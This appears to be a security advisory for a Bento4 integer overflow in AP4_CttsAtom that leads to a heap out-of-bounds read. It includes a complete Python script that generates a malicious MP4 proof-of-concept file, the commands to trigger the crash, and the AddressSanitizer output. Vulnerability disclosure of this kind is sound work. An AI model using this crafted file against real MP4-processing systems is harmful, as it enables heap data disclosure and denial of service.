## Bug0: AP4_CttsAtom constructor 32-bit integer overflow leading to heap out-of-bounds read

In `AP4_CttsAtom::AP4_CttsAtom()` in `Ap4CttsAtom.cpp` (lines 79-97), the expression `entry_count * 8` is computed as a 32-bit multiplication with no overflow check, so an attacker-controlled `entry_count` of `0x20000000` wraps the product to zero and causes the subsequent loop to read heap memory far beyond the zero-byte allocation.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(box_type, payload):
    size = 8 + len(payload)
    return struct.pack(">I4s", size, box_type) + payload

def full_box(box_type, version, flags, payload):
    fb_payload = struct.pack(">I", (version << 24) | (flags & 0xFFFFFF)) + payload
    return box(box_type, fb_payload)

# ftyp
ftyp = struct.pack(">I", 20) + b'ftyp' + b'isom' + struct.pack(">I", 0) + b'isom'

# stco, stsz, stsc, stts, stsd (all minimal/empty)
stco = full_box(b'stco', 0, 0, struct.pack(">I", 0))
stsz = full_box(b'stsz', 0, 0, struct.pack(">II", 0, 0))
stsc = full_box(b'stsc', 0, 0, struct.pack(">I", 0))
stts = full_box(b'stts', 0, 0, struct.pack(">I", 0))
stsd = full_box(b'stsd', 0, 0, struct.pack(">I", 0))

# ctts (VULNERABLE BOX): size=20, entry_count=0x20000000, no actual entries
ctts_raw = (struct.pack(">I", 20) + b'ctts' +
            struct.pack(">I", 0) +            # version=0, flags=0
            struct.pack(">I", 0x20000000))    # entry_count triggers 32-bit overflow

stbl = box(b'stbl', stsd + stts + ctts_raw + stsc + stsz + stco)

url_entry = full_box(b'url ', 0, 1, b'')
dref = full_box(b'dref', 0, 0, struct.pack(">I", 1) + url_entry)
dinf = box(b'dinf', dref)
smhd = full_box(b'smhd', 0, 0, struct.pack(">HH", 0, 0))
minf = box(b'minf', smhd + dinf + stbl)

mdhd = full_box(b'mdhd', 0, 0, struct.pack(">IIIIHH", 0, 0, 44100, 0, 0x15C7, 0))
hdlr_payload = (struct.pack(">I", 0) + b'soun' +
                struct.pack(">III", 0, 0, 0) + b'SoundHandler\x00')
hdlr = full_box(b'hdlr', 0, 0, hdlr_payload)
mdia = box(b'mdia', mdhd + hdlr + minf)

tkhd_payload = struct.pack(">IIIII", 0, 0, 1, 0, 0)
tkhd_payload += struct.pack(">II", 0, 0)
tkhd_payload += struct.pack(">hhhh", 0, 0, 0x0100, 0)
tkhd_payload += struct.pack(">iiiiiiiii",
    0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
tkhd_payload += struct.pack(">II", 0, 0)
tkhd = full_box(b'tkhd', 0, 3, tkhd_payload)

trak = box(b'trak', tkhd + mdia)

mvhd_payload = struct.pack(">IIIII", 0, 0, 1000, 0, 0x00010000)
mvhd_payload += struct.pack(">H", 0x0100) + b'\x00' * 10
mvhd_payload += struct.pack(">iiiiiiiii",
    0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
mvhd_payload += b'\x00' * 24 + struct.pack(">I", 2)
mvhd = full_box(b'mvhd', 0, 0, mvhd_payload)

moov = box(b'moov', mvhd + trak)
mp4_data = ftyp + moov

with open("poc_input.mp4", "wb") as f:
    f.write(mp4_data)
print(f"Written {len(mp4_data)} bytes to poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5020000000f1 at pc 0x55f931838094 bp 0x7ffe6957b770 sp 0x7ffe6957b760
READ of size 1 at 0x5020000000f1 thread T0
    #0 0x55f931838093 in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa1093)
    #1 0x55f931839087 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)

### Impact

A crafted MP4 file with a `ctts` atom declaring `entry_count >= 0x20000000` causes `AP4_CttsAtom::AP4_CttsAtom()` to allocate a zero-byte (or undersized) read buffer due to 32-bit overflow and then loop over it `entry_count` times, reading arbitrary heap memory into the entries array. This heap out-of-bounds read is reachable whenever mp42aac (or any Bento4-based tool) processes an untrusted MP4 file, enabling potential information disclosure of heap contents and, combined with the corrupted composition-time offset values written to `m_Entries`, may trigger further invalid memory accesses that cause denial of service or contribute to exploitation.
